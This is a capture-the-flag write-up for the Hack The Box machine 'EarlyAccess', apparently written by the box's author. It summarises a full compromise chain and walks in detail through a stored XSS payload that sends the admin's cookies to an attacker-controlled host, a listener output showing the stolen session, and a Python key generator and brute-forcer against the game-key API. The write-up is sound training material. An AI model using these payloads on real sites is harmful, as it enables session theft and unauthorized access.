---
layout: post
title: "Hack The Box - EarlyAccess Writeup"
author: Chr0x6eOs
date: "2022-02-12"
subject: "EarlyAccess Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Chr0x6eOs, Linux, XSS, Python, cracking, reversing, SQL-injection, SQLi, union-injection, john, John, Hashcat, LFI, PHP, RCE, mysql, JavaScript, Code-Analysis, network, arp]
lang: "en"
image:
    path: assets/htb/EarlyAccess/logo.png
    width: 300
    height: 300
...
![Box](/assets/htb/EarlyAccess/earlyaccess.png)

[EarlyAccess](https://app.hackthebox.com/machines/EarlyAccess) is a hard linux box created by [Chr0x6eOs](https://app.hackthebox.com/users/134448) (me). 

### Overview

This box is designed around the theme game-development. A game company has released an early access version of their game for alpha-users to test. Exploiting a stored XSS (sending the payload in the username) allows players to get administrative access to the webpage. The company has experienced issues with their game-key verification API. In order to tackle the issue, the key-verification algorithm (written in Python) is available for admins to download. The API uses a rotating magic number to verify the key, which is being changed every 30 minutes. Reversing the Python script and brute-forcing the magic number using the API, a valid game-key can be generated. 

Once a game-key is registered, the player can access the game on another VHost. The scoreboard of the game is vulnerable to a second-order SQL-injection due to incorrect handling of the username. In order to exploit this vulnerability, the player has to change his name to a SQL-injection payload. Using the SQL-injection, the admin password-hash can be retrieved and cracked.

Using the admin credentials, the dev VHost can be accessed. The webpage contains tools for administrative users to test hash-functions and file-operations. Using the file-tool (`/actions/file.php?filepath=FILE`) files can be included. Using php://filter the source code of the hashing tool can be leaked. Analyzing the source code, the hashing-tool takes a user-defined hashing-function and password to hash. The player can exploit this, by specifying a custom PHP-function (e.g: `system`) and a custom parameter (e.g: `id`) to gain arbitrary PHP-code-execution / remote-code-execution. Using the RCE, the player can get a reverse-shell on the webserver, which is running in a docker-container.

Due to password-reuse, the player can escalate his privileges on the webserver from www-data to www-adm. The home-folder of the www-adm user contains a `.wgetrc` file which contains HTTP-Basic auth credentials for the API. Using these credentials, the player can access the `/check_db` endpoint which lists the attributes of the MySQL-container. The environment variables contain the username and password for user.

Using the username and password the player can ssh in as user and read user.txt. Upon login as the user, the player gets a notification of an unread email. Looking at the user's email, the player is informed that there is a game-server that the user should test. As regular crashes were reported, the server is configured with a healthcheck feature that automatically restarts the server upon failure.

Further enumerating the user's home-folder the player can find an ssh-key for `game-tester@game-server`. Using the ssh-key the player can login as game-tester into the game-server (the player has to find the IP of the docker-container first). There he finds that the folder `/opt/docker-entrypoint.d` on the host is mounted into the docker-container and user has write-permissions on the host. Furthermore, he finds that the entrypoint script executes all scripts in the mounted directory upon startup. The game running on the server is a node-js application that hosts an early development version of another game. An autoplay function is available, which takes an amount of rounds and plays that amount of games in a loop. The player can cause an endless-loop in the game by supplying a negative amount of rounds, causing the server to hang and restart. As the player can specify scripts that are executed upon startup, the player can get arbitrary-code execution as root on the game-server. As root, the player can read /etc/shadow and crack the game-adm password.

After switching user to game-adm, the player has to enumerate the system to find that game-adm is allowed to run `/usr/sbin/arp`. Furthermore, arp has empty capabilities (essentially making it a SUID-binary) set. Using the arp binary, the player can get arbitrary file-read as root and read root.txt and root's ssh-key.

## Information Gathering

### Nmap

```bash
root@void:~# nmap -sC -sV 10.10.11.110
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-03 08:24 EST
Nmap scan report for 10.10.11.110
Host is up (0.049s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)
|   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)
|_  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)
80/tcp  open  http     Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to https://earlyaccess.htb/
443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: EarlyAccess
| ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT
| Not valid before: 2021-08-18T14:46:57
|_Not valid after:  2022-08-18T14:46:57
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The open ports shown are **22** (SSH), **80** (HTTP) and **443** (HTTPS). In addition to the open ports, nmap gives us some more interesting information for HTTP and HTTPS. Nmap shows us that HTTP redirects to <https://earlyaccess.htb> and returns us some interesting information about the SSL-certificate. Let us add the hostname to our /etc/hosts file before continuing our enumeration on HTTPS.

```bash
root@void:~# tail -n1 /etc/hosts
10.10.11.110    earlyaccess.htb
```

### HTTPS - Port 443

As HTTP immediately redirects to https, we can start our enumeration on <https://earlyaccess.htb>. Going to the url, we get following webpage shown:

![earlyaccess.htb index-webpage](/assets/htb/EarlyAccess/https/index-webpage.png)

The main webpage only talks about some game being developed. As there is not much interesting information on this site, let us start by registering an account.

![Registering an account](/assets/htb/EarlyAccess/https/register-webpage.png)

After registration, we get redirected to the dashboard.

![Dashboard](/assets/htb/EarlyAccess/https/dashboard-webpage.png)

Looking at the menu, we have a couple of places to look around. Let us start by clicking on each menu-point and see where this leads to.

#### Webpage-enumeration

#### Messaging

![Messaging](/assets/htb/EarlyAccess/https/menu-messaging.png)

Checking out the messaging page, we have three subpages:

- Inbox
- Outbox
- Contact

Inbox and outbox are currently empty, as we have not send any messages yet. We can send messages using the Contact page.

![Contact webpage](/assets/htb/EarlyAccess/https/contact-webpage.png)

Using the contact page, we can message the administrator (`admin@earlyaccess.htb`). Let us send a message to see what happens.

![Sending a message](/assets/htb/EarlyAccess/https/messaging-test.png)

Looking at our Outbox, we now have our sent message listed. Let us read this message.

![Detailed message](/assets/htb/EarlyAccess/https/messaging-test-detail.png)

The message contains our subject as the heading, our username and our message body. We can also delete the message or reply to it. After waiting some time, we get a response to our message in our inbox.

![Response message](/assets/htb/EarlyAccess/https/messaging-test-inbox.png)

Let us read the response we got.

![Response message detail](/assets/htb/EarlyAccess/https/messaging-test-inbox-detail.png)

Seems like the admin has received our message and responded to us! The first thing I think about when being able to message an admin is XSS. However, before using this possible attack-vector let us continue our enumeration.

#### Forum

![Messaging](/assets/htb/EarlyAccess/https/menu-forum.png)

Looking at the forum, we have a couple of entries that may be interesting.

![Forum entry 1](/assets/htb/EarlyAccess/https/forum-1.png)

The first entry mentions a bug in the scoreboard, because the username contains a single-quote. As a response to the issue, the team seems to have blacklisted certain characters for the username in the registration. Let us keep this in mind to check back later on, after we finished our enumeration.

![Forum entry 2](/assets/htb/EarlyAccess/https/forum-2.png)

The second entry talks about a user that was not able to register his game-key to his account. The support staff acknowledges the issue and talks about a resolution using a manual verification mechanism by the administrative staff.

The other entries don't seem to hold any interesting information.

#### Store

![Store](/assets/htb/EarlyAccess/https/menu-store.png)

The store page is not available to use yet.

#### Register key

![Game Key](/assets/htb/EarlyAccess/https/menu-key.png)

The Register key page allows us to register a game-key. Sending the placeholder (`AAAAA-BBBBB-CCCC1-DDDDD-1234`) as a key gives us following error:

![Game Key error](/assets/htb/EarlyAccess/https/key-error-webpage.png)

As we do not know a valid game-key, let us continue our enumeration.

#### Profile

![Profile](/assets/htb/EarlyAccess/https/menu-profile.png)
![Profile2](/assets/htb/EarlyAccess/https/menu-profile-2.png)

Looking at the profile page, we can change our username, email, password but also see our browser sessions and delete our account.

Now that we enumerated all menu-points, we have gathered some interesting information:

1. We can send messages to the admin
2. Registration has a blacklist implemented for username
3. Admins have access to some sort of manual game-key verification
4. We can register a game-key to our account
5. We can edit our user on the profile page

#### Vulnerability enumeration

Let us verify that the blacklisting is active by trying to register another user using possible forbidden characters.

![Registering a new account with special characters](/assets/htb/EarlyAccess/https/register-special.png)

Seems like the blacklist is indeed active on the registration page. Remembering back to our enumeration, we are able to change our username later on using the profile page. Let us check, if the blacklisting is also active on the profile page. For this we register the test-account with a valid username.

![Successfully changed username](/assets/htb/EarlyAccess/https/profile-special.png)

The development team seems to have forgotten about implementing the blacklisting for the profile page. So now we are able to change our username without any restrictions. Let us play around with the messaging next. Let us take a look at the source-code of the contact us page.

```html
<form class="form-horizontal" role="form" method="POST" action="https://earlyaccess.htb/contact">
    <input type="hidden" name="_token" value="2CsEOKKtThquXbu4I01m1vklcvvIyl2D7TrwFV5i">
    <input type="hidden" id="email" name="email"  value="admin@earlyaccess.htb" >
    <div class="form-group">
        <label for="subject" class="col-md-4 control-label">Subject:</label>
        <div class="col-md-6">
            <input id="subject" class="input" name="subject"  placeholder="Issue with: XXX" required></input>
        </div>
    </div>
    <div class="form-group">
        <label for="message" class="col-md-4 control-label">Type in your message:</label>
        <div class="col-md-auto">
            <textarea id="message" class="form-control" rows="3" name="message" placeholder="[...]" required></textarea>
        </div>
    </div>
    <button id="contact" type="submit" class="btn btn-primary">Send</button>
</form>
```

Looking at the contact us page-form, we can see there are two hidden-fields being send: `_token` (probably CSRF-token) and `email`. Let us intercept this request in burp and change the email to the mail of our second account and see, if we are able to send messages between these accounts.

The send request looks like this:

```http
POST /contact HTTP/1.1
Host: earlyaccess.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Origin: https://earlyaccess.htb
Connection: close
Referer: https://earlyaccess.htb/contact
Cookie: XSRF-TOKEN=[...]; earlyaccess_session=[...]

_token=2CsEOKKtThquXbu4I01m1vklcvvIyl2D7TrwFV5i&email=admin@earlyaccess.htb&subject=Test&message=Test
```

Let us change the request-mail from `admin@earlyaccess.htb` to `test@mail.com`.

![Message email-changed](/assets/htb/EarlyAccess/https/message-mail-changed.png)

We successfully messaged our other test-user. We can now test for XSS by changing all three values of the message: `subject`, `username` and `body`. We can start the test by using an HTML-element (e.g: `<h1>Test</h1>`).

![Changed username](/assets/htb/EarlyAccess/https/xss-test-user.png)

We can now send the message to our main-user.

![XSS message test](/assets/htb/EarlyAccess/https/xss-test-message.png)

Looking at the message received on our main account, we can see that we have possible XSS using the username, as it is rendered as a heading instead of showing the HTML-code.

![XSS test result](/assets/htb/EarlyAccess/https/xss-test-result.png)

Let us verify the XSS now by changing our username on the test-account to `<script>alert(1);</script>` and sending another message.

![XSS successful](/assets/htb/EarlyAccess/https/xss-successful.png)

We successfully verified the XSS vulnerability using the username field. Let us exploit this vulnerability to get the admin-cookie.

#### Exploiting XSS to get admin-cookie

Let us use following payload to get the admin-cookie:

```js
<script>document.location="http://IP/?c="+document.cookie;</script>
```

In order to receive the cookie, we have to listen for http-connections. For this we can use the python http.server module.

```bash
root@void:/tmp# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Next we have to change our username to the XSS-payload, send a message to the admin and wait until we receive the cookie.

![Sending XSS to admin](/assets/htb/EarlyAccess/https/xss-admin.png)

After sending the message, we have to wait about a minute until we finally get a response:

```bash
root@void:~# python3 -m http.server 80                    
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.110 - - [03/Feb/2022 09:25:24] "GET /?c=XSRF-TOKEN=eyJpdiI6IjZ1c3BncGUraGh6ZGt6SEpjeXh2TlE9PSIsInZhbHVlIjoiZktEa2kwd3ZQUGVyY01EYXBJU3J5Skc3c0UwVjBPK1pKdEpFSzlHMlkzc21ZbWVNUG5yUXNsRkVGRHg5TlZCYWkvY1J2SXJLYnhwall5T0x5Y2pFcmcrb0NwQk1tLzVwMzM5QkdIL2hlcWgreWZRZUdmNVdMNUYwc1kwZy95dmsiLCJtYWMiOiJhMWQwMzUxZTRjZjM1NDVjZDFjNDAzNzZkMjQ5ZjAxMTQ5ZjU2MmUyNTZlNzE3ZjZiODYwNzlhZDBkZmMxMTZmIn0%3D;%20earlyaccess_session=eyJpdiI6IlVWcjB0cmNqQ0ovYnZaL0tWczIxdGc9PSIsInZhbHVlIjoiQUFNQ0ZUQ3N2a2xYQkxYRnpicU0xaGRqaHU4ai9aU093TkNtVmdDRno1K3dDT01WMzZPdWpod3EzWVZSOFkrcmNwd3BKZHBIUFlQdVZJanVxL3YycldmVUxkQ0J4SVc2OEk1MjRrcHcwNEwydi9mUHk5bjFjZFFFeEM0Z25zbU4iLCJtYWMiOiI4YzRlZTA3NTI5NTQwYjk5NGY3MWJhOTE0YzBjNmVkYjliMDRkZjM5OTAzY2NiNzc0OGVhNWFhNjYwZGI1MWE2In0%3D HTTP/1.1" 200 -
```

We successfully get the admin-cookie! Let add the `earlyaccess_session` cookie to a new tab.

#### Enumeration as admin

After adding the cookie and refreshing the page, we can now work on the webpage as admin.

![Admin dashboard](/assets/htb/EarlyAccess/https/admin-panel.png)

As the admin we have three new menu-points:

- Admin
- Dev Host
- Game

Let us take a look at the admin menu first.

![User management](/assets/htb/EarlyAccess/https/admin-user-mgmt.png)

The user-management is not available yet.

![Admin backup](/assets/htb/EarlyAccess/https/admin-backup.png)

The `Download backup` tab seems to contain the manual game-key verification that was talked about in the forum entry before. Let us download the Key-validator and then continue our enumeration.

![Backup downloaded](/assets/htb/EarlyAccess/https/backup-downloaded.png)

We successfully downloaded the backup for later analysis.

![Admin key verify](/assets/htb/EarlyAccess/https/admin-key-verify.png)

Interestingly, when verifying a game-key, we get more information as admin: `DEBUG: <INFO>`. Let us keep that in mind for later.

`Dev` leads to <http://dev.earlyaccess.htb> and `Game` leads to <http://game.earlyaccess.htb>. Let us add these two sub-domains to our /etc/hosts file.

```bash
root@void:~# tail -n 1 /etc/hosts
10.10.11.110    earlyaccess.htb dev.earlyaccess.htb game.earlyaccess.htb
```

Going to dev, we get shown following page:

![Dev Login](/assets/htb/EarlyAccess/http/dev-login.png)

In order to access the development page, we have to know the password of the admin user. Any type of bruteforce results into a temporary ban.

![Login ban](/assets/htb/EarlyAccess/http/login-ban.png)

Without admin-credentials, we cannot access any resources. Let us look at game then.

![Game login](/assets/htb/EarlyAccess/http/game-login.png)

The game page is also protected by a login. However, this time we can supply an email. Let us try to login with our existing account.

![Login no key](/assets/htb/EarlyAccess/http/game-login-nokey.png)

The login fails, with an error-message stating that our account does not have a game-key linked. Let us verify that this error-message does not show with a non-existing account.

![Invalid creds](/assets/htb/EarlyAccess/http/game-login-invalid.png)

With an non-existing account, we get a different error-message. Seems like we have fully enumerated all new resources. Let us start taking a look at the key-validator next.

### Key-validator

#### Enumeration

Let us start the enumeration by unzipping the file.

```bash
root@void:~/Downloads# unzip backup.zip 
Archive:  backup.zip
  inflating: validate.py
root@void:~/Downloads# file validate.py 
validate.py: Python script, ASCII text executable
```

Let us take a look at the python script. We are going to split the script into small segments and analyze each segment separately.

#### Imports

```python
#!/usr/bin/env python3
import sys
from re import match
```

Two imports are done:

- [sys library](https://docs.python.org/3/library/sys.html)
- match function from the [re library](https://docs.python.org/3/library/re.html)

#### Key class

```python
class Key:
    key = ""
    magic_value = "XP" # Static (same on API)
    magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)
```

The key class contains three members: `key`, `magic_value` and `magic_num`. As mentioned on the website, the magic_num has to be synched with the API.

#### Key class functions

```python
def __init__(self, key:str, magic_num:int=346):
    self.key = key
    if magic_num != 0:
        self.magic_num = magic_num

@staticmethod
def info() -> str:
    return f"""
    # Game-Key validator #

    Can be used to quickly verify a user's game key, when the API is down (again).

    Keys look like the following:
    AAAAA-BBBBB-CCCC1-DDDDD-1234

    Usage: {sys.argv[0]} <game-key>"""
```

The constructor of the function sets the key and the magic_num. The next method defined returns a usage-information for the script.

```python
def valid_format(self) -> bool:
    return bool(match(r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$", self.key))
```

The `valid_format` function verifies that the inputted key is in the defined format. The format is: `AAAAA-BBBBB-CCCC1-DDDDD-1234`.

```python
def calc_cs(self) -> int:
    gs = self.key.split('-')[:-1]
    return sum([sum(bytearray(g.encode())) for g in gs])
```

The `calc_cs` function takes the key and splits it into groups (delimited by `-`). The last group is skipped. Then the ASCII-byte-values of each characters of each group are summed up. Further down in the script, we have an error message in relation to the function that talks about `checksum`. We can assume that `cs` refers to checksum.

#### Game-Key validation

Next we have four functions: `g1_valid`, `g2_valid`, `g3_valid` and `g4_valid`. Looking at the functions from a top-down view, it seems that each group (delimited by `-`) is verified separately. Let us reverse each group-validation.

```python
def g1_valid(self) -> bool:
    g1 = self.key.split('-')[0]
    r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
    if r != [221, 81, 145]:
        return False
    for v in g1[3:]:
        try:
            int(v)
        except:
            return False
    return len(set(g1)) == len(g1)
```

The `g1_valid` function starts by taking the first group of the key (e.g: `AAAAA`). Then it goes through the first 3 characters and shifts the ASCII-value by it's index+1, modulo 256 (don't overflow 1 byte) and then gets XORed with itself. Then it is checked, if the result matches three static values. For the last two values it is checked if the value is an integer. Finally it is checked, if the length of all unique characters matches the length of the group (= no duplicates). This means, we have three conditions for the first group:

1. First three characters going through shift+XOR returns specific result
2. Last two chars are integers
3. No duplicates

```python
def g2_valid(self) -> bool:
    g2 = self.key.split('-')[1]
    p1 = g2[::2]
    p2 = g2[1::2]
    return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))
```

The `g2_valid` function starts by taking the second group of the key (e.g: `BBBBB`). Then the key is split into even (`p1`) and odd (`p2`) indices. Then all ASCII-values of the even and the odd indices are summed up and compared. If the sums match, the group is valid.

This results into one condition:

1. Sum of the even and odd ASCII-values result into the same value

```python
def g3_valid(self) -> bool:
    # TODO: Add mechanism to sync magic_num with API
    g3 = self.key.split('-')[2]
    if g3[0:2] == self.magic_value:
        return sum(bytearray(g3.encode())) == self.magic_num
    else:
        return False
```

The `g3_valid` function starts by taking the third group of the key (e.g: `CCCC1`). There is a `TODO` note, that talks about synching the `magic_num` with the API. After getting the third group, the function checks if the first two characters match the `magic_value` (static: `XP`). Then it is checked, if the sum of all ASCII-values of the third group matches the `magic_num`.

This results into two conditions:

1. First two characters match `magic_value`
2. Sum of all characters match `magic_num`

```python
def g4_valid(self) -> bool:
    return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]
```

The `g4_valid` function starts by taking the fourth group of the key (e.g: `DDDDD`). Then it XORs each character of the first group with the fourth group and checks the XOR results into a static value.

This results into one condition:

1. XOR of first and fourth group returns specific result

After the group validation the `calc_cs` function is called in the `cs_valid` function.

```python
def cs_valid(self) -> bool:
    cs = int(self.key.split('-')[-1])
    return self.calc_cs() == cs
```

The `cs_valid` function takes the last group of the key and checks if it matches `calc_cs` (sum of all ASCII-values).

This results into one condition:

1. Inputted checksum has to match key-checksum

#### Key verification

```python
def check(self) -> bool:
    if not self.valid_format():
        print('Key format invalid!')
        return False
    if not self.g1_valid():
        return False
    if not self.g2_valid():
        return False
    if not self.g3_valid():
        return False
    if not self.g4_valid():
        return False
    if not self.cs_valid():
        print('[Critical] Checksum verification failed!')
        return False
    return True
```

The `check` function verifies that all group-conditions are met.

#### Main function

````python
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(Key.info())
        sys.exit(-1)
    input = sys.argv[1]
    validator = Key(input)
    if validator.check():
        print(f"Entered key is valid!")
    else:
        print(f"Entered key is invalid!") 
````

The `main` function first checks if the script was called with an argument. If not, the key-usage is shown. Else, it takes the argument and creates the validator using the `Key` class. Finally it calls the `Key.check` function and prints the result of the verification.

#### Generating a valid key

In order to generate a valid key, we have to meet specific conditions for each group. Let us start to generate valid values for each groups.

#### Group1

We can solve this by either brute-forcing or reversing the function. However, as in this case, we know the results we can simply calculate the matching characters. For this we can create a simple script, which calculates all possible values for each index.Then we simply have to get the character that matches the wanted result:

```python
{(ord(v) << 1) % 256 ^ ord(v) : v for v in string.ascii_uppercase}
{195: 'A', 198: 'B', 197: 'C', 204: 'D', 207: 'E', 202: 'F', 201: 'G', 216: 'H', 219: 'I', 222: 'J', 221: 'K', 212: 'L', 215: 'M', 210: 'N', 209: 'O', 240: 'P', 243: 'Q', 246: 'R', 245: 'S', 252: 'T', 255: 'U', 250: 'V', 249: 'W', 232: 'X', 235: 'Y', 238: 'Z'}
```

Using the above code, we generate a dictionary, where the dict-key is set to the result of the shift+XOR and the dict-value is the character. To get the right character for each index, we simply have get the right dict-element.

```python
{(ord(v)<<1)%256^ord(v):v for v in string.ascii_uppercase}[221]
'K'
```

The first character of the first group is `K`. We can now run this in a loop to generate the first three characters of the first group.

```python
#!/usr/bin/env python3
import string

def gen_g1() -> str:
    g1 = []
    target = [221,81,145]

    while len(g1) != 3:
        g1.append({(ord(v)<<len(g1)+1)%256^ord(v):v for v in string.ascii_uppercase}[target[len(g1)]])

    g1.append(str(randrange(0,5)))
    g1.append(str(randrange(5,10)))
    
    return "".join(g1)
```

Executing this script returns: `KEY`. We now know that the first three characters of the game-key are: `KEY`. Next, we have to append two different numbers to the key (e.g: `01`). We have successfully generated a valid value for the first group: `KEY01`.

#### Group2

For the second group we can simply calculate some possible values using simple math. There are five characters in the second group. Three have even indices and two have odd indices. This results into following math equation:

```python
3*even = 2*odd
```

This results into following python code to generate some possible values:

```python
def gen_g2() -> str:
    g2 = []
    values = string.ascii_uppercase+string.digits
    
    for x in values:
        for y in values:
            if ord(x)*3 == ord(y)*2:
                g2.append((x+y) * 2 + x)
    return g2
    #return g2[randrange(0,len(g2))] # Get random working key
```

If we return the entire g2 list instead of a random element in g2, we get following values:

```python3
['0H0H0', '2K2K2', '4N4N4', '6Q6Q6', '8T8T8']
```

We can now create the first two parts of our key:

```python
>>> key = f"{gen_g1()}-{gen_g2()}"
>>> print(key)
KEY27-0H0H0
```

#### Group3

For the third group we have to calculate a value for all possible `magic_num` values. Let us see how many `magic_num` values there are.

This can be done very easy, as we know the format of the third group: `XP[A-Z][A-Z][0-9]`. This means we get the lowest `magic_num` with `XPAA0` and the highest with `XPZZ9`.

```python
>>> sum(bytearray(b"XPAA0"))
346
>>> sum(bytearray(b"XPZZ9"))
405
>>> 405-346 + 1
60
```

As the lowest magic_num is 346 and the highest is 405, we have a total of 60 possible keys (346 is included), that we have to bruteforce against the API. Let us now generate a group for each possible `magic_num`. For generating the key I came up with following solution:

```python
def gen_g3(magic_num:int, magic_value:str="XP") -> str:
    remain = magic_num - sum(bytearray(magic_value.encode()))

    for num in range(ord("0"), ord("9")+1):
        target = remain - num
        if target % 2 == 0:
            half = int(target / 2)
            if half >= ord("A") and half <= ord("Z"):
                return f"XP{2*chr(half)}{chr(num)}"
        if (target - 65) >= ord("A") and (target - 65) <= ord("Z"):
            return f"XPA{chr(target-65)}{chr(num)}"
```

First we generate the remaining number we have to get (remove magic_value from specific magic_num). Then we go from 0 to 9, remove it from the remaining number and then check if the remaining value is even. If so, we can check what two values sum up to the even sum and see if they are in our ASCII range. If so, we found a valid key. If the number is not even, we add an `A` (uneven ASCII-value) and check if the remaining number is in our ASCII range. Using this logic, we can generate any `magic_num` using these two options:

- `[A-Z]{2}`

- `A[A-Z]`

We can now generate all possible values for the first three groups by changing the main function to this:

```python
if __name__ == "__main__":
    keys = []
    for magic_num in range(sum(bytearray(b"XPAA0")), sum(bytearray(b"XPZZ9"))+1):
        key = f"{gen_g1()}-{gen_g2()}-{gen_g3(magic_num)}"
        keys.append(key)
    
    print(f"[+] Generated {len(keys)} keys:")
    print("\n".join(keys))
```

Running the function returns 60 keys:

```python
[+] Generated 60 keys:
KEY18-6Q6Q6-XPAA0
KEY05-6Q6Q6-XPAB0
KEY15-4N4N4-XPBB0
KEY15-2K2K2-XPAD0
KEY09-6Q6Q6-XPCC0
[...............]
KEY09-0H0H0-XPZZ5
KEY07-4N4N4-XPZZ6
KEY27-2K2K2-XPZZ7
KEY38-6Q6Q6-XPZZ8
KEY49-0H0H0-XPZZ9
```

#### Group4

For the fourth group, we have a XOR between group1 and group4 that results into a certain target. This can be solved very easy as well, because XOR works in both direction: `A ^ B = C` → `A ^ C = B`.

The result of the XOR is: `[12, 4, 20, 117, 0]`, so we can reverse the code like this:

```python
def gen_g4(g1:str) -> str:
    return "".join([chr(i^ord(g)) for g, i in zip(list(g1), [12, 4, 20, 117, 0])])
```

#### Checksum

We can reuse the `calc_cs` function from the script to calculate the checksum (fifth group).

```python
def calc_cs(key) -> int:
    gs = key.split('-')
    return sum([sum(bytearray(g.encode())) for g in gs])
```

#### gen_key function

We can now create a function that generates either all keys or the key for the inputted magic_num:

```python
def gen_key(magic_num:int=-1) -> List[str]:
    keys = []
    if magic_num == -1:
        # Calculate all keys
        for magic_num in range(sum(bytearray(b"XPAA0")), sum(bytearray(b"XPZZ9"))+1):
            g1 = gen_g1()
            key = f"{g1}-{gen_g2()}-{gen_g3(magic_num)}-{gen_g4(g1)}"
            key += f"-{calc_cs(key)}"
            keys.append(key)
        print(f"[+] Generated {len(keys)} keys!")
        return keys
    else:
        # Calculate for specific magic_num
        g1 = gen_g1()
        key = f"{g1}-{gen_g2()}-{gen_g3(magic_num)}-{gen_g4(g1)}"
        key += f"-{calc_cs(key)}"
        keys.append(key)
        return keys
```

#### Generating a key

Finally we can call the `gen_key` function in the main function:

```python
if __name__ == "__main__":
    if len(sys.argv) > 1:
        print(f"[*] Calculating key for magic_num {sys.argv[1]}...")
        print("".join(gen_key(int(sys.argv[1]))))
    else:
        print("[*] Calculating all possible keys...")
        keys = gen_key()
        print("\n".join(keys))
```

We can now either run the script with a specific magic_num or generate all keys.

```python
root@void:~# python3 gen_key.py 346
[*] Calculating key for magic_num 346...
KEY05-6Q6Q6-XPAA0-GAME5-1339
```

```python
root@void:~# python3 gen_key.py
[*] Calculating all possible keys...
[+] Generated 60 keys!      
KEY16-4N4N4-XPAA0-GAMD6-1329
KEY47-8T8T8-XPAB0-GAMA7-1356
KEY35-0H0H0-XPBB0-GAMF5-1309
KEY28-8T8T8-XPAD0-GAMG8-1364
[..........................]
KEY49-4N4N4-XPZZ5-GAMA9-1390
KEY35-0H0H0-XPZZ6-GAMF5-1363
KEY06-6Q6Q6-XPZZ7-GAME6-1398
KEY47-0H0H0-XPZZ8-GAMA7-1365
KEY38-2K2K2-XPZZ9-GAMF8-1384
```

Now that we can generate all keys, we can test each key against the API using either curl (parsing from the python-script) or directly in python. Because automation is fun, we are going to add the functionality to test each key directly into the python script.

#### Submitting Keys

In order to submit keys, we can use the [requests module](https://docs.python-requests.org).

```python
def submit_key(session:requests.Session, key:str) -> bool:
    res = session.get(f"{url}/key", proxies=proxies)
    soup = BeautifulSoup(res.text, features='lxml')
    token = soup.find('input',{'type':'hidden'}).attrs["value"]
    data = {'_token':token, 'key':key}

    resp = session.post(f"{url}/key/add", data=data, proxies=proxies)
    soup = BeautifulSoup(resp.text, features='lxml')
    out = soup.find('div',{'class':'toast-body'})
    if out:
        out = out.text
    else:
        return False

    if "Game-key successfully added" in out or "Game-key is valid" in out:
        return True
    elif "Game-key is invalid" in out:
        return False
    elif "Too many requests" in out:
        print(f"[!] Got blocked! Waiting 60 seconds and then retrying...")
        sleep(60)
        # Retry after 60 seconds
        submit_key(session, key)
    else:
        print(f"[!] Unexpected result: {out}")
        return False
```

In order to submit a key, we first have to find the CSRF-token. For this we can use [BeautifulSoup](https://www.crummy.com/software/BeautifulSoup/) to parse the HTML. After submitting the key, we have to parse the output and see what response we got. As the game-key is linked to a user-account, we have to login as a user. For this I implemented a login functionality or the ability to use a cookie (if we want to execute as the admin instead).

```python
def login(session:requests.Session, email:str, password:str) -> requests.Session:
    res = session.get(f"{url}/login", proxies=proxies)
    soup = BeautifulSoup(res.text, features='lxml')
    token = soup.find('input',{'type':'hidden'}).attrs["value"]
    data = {'_token':token,'email':email, 'password':password}
    resp = session.post(f"{url}/login", proxies=proxies, data=data)
    return "dashboard" in resp.url
```

The login function uses the inputted email and password to login.

#### Additional: Bruteforcing the group3

Theoretically a user could also bruteforce the group3 by trying out every possible combination. However, this results into a lot more keys.

```python
def gen_all_keys() -> list:
    keys = []
    values = ascii_uppercase
    possible = product(values, repeat=2)

    for group3 in possible:
        for i in range(0, 10):
            test = "XP" + "".join(group3) + str(i)
            key = f"KEY01-0H0H0-{test}-GAME1-"
            checksum = calc_checksum(key)
            key += str(checksum)
            keys.append(key)
    return keys
```

We can check how many keys there are, if we would bruteforce:

```python
>>> print(f"Generated {len(gen_all_keys())} possible keys!")
Generated 6760 possible keys!
```

If we would bruteforce all possible keys (`6760`) we would get 112-times more keys than if we would consider duplicates (`60`).

When now trying to bruteforce all keys, sooner or later we will get blocked for 60 seconds. Theoretically it would still be possible to bruteforce the key, however it will take quite some time and if the 30-minute time-window is missed, the magic_number will be rotated and the bruteforce would have to be restarted.

```python
root@void:~# python3 gen_key.py --email chronos@mail.com --password P@ssw0rd
[*] Testing 6760 possible keys!
[0.84%]  Trying key: KEY01-0H0H0-XPAF6-GAME1-1306
[!] Got blocked! Waiting 60 seconds and then retrying...
```

#### Adding a key to our account

Now that we have successfully created our script, let us run it to register a key to our account. The full script source code is available on my [GitHub](https://github.com/chr0x6eos/HTB/tree/master/EarlyAccess).

```python
root@void:~# python3 gen_key.py -h
usage: gen_key.py [-h] [--email EMAIL] [--password PASSWORD] [-c COOKIE] [-d 1] [-p http://127.0.0.1:8080] [-m [346-406]] [-l]

Game-Key generation script by Chr0x6eos

optional arguments:
  -h, --help            show this help message and exit
  --email EMAIL         Email of your account
  --password PASSWORD   Password of your account
  -c COOKIE, --cookie COOKIE
                        Cookie to use
  -d 1, --delay 1       Delay between requests (in seconds)
  -p http://127.0.0.1:8080, --proxy http://127.0.0.1:8080
                        HTTP proxy
  -m [346-406], --magic_num [346-406]
                        Magic number to use
